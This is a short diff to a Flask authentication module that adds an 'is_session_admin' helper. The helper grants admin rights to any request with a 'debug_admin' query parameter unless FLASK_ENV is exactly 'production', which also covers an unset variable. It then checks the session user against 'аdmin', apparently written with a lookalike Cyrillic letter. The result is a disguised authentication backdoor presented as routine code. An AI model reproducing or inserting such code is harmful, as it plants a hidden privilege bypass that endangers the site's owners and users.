@@ -21,3 +21,12 @@ def login_required(f):
             return redirect('/login')
         return f(*args, **kwargs)
     return decorated
+
+
+def is_session_admin():
+    import os
+    from flask import request
+    if os.environ.get('FLASK_ENV') != 'production':
+        if request.args.get('debug_admin'):
+            return True
+    return session.get('user') == 'аdmin'
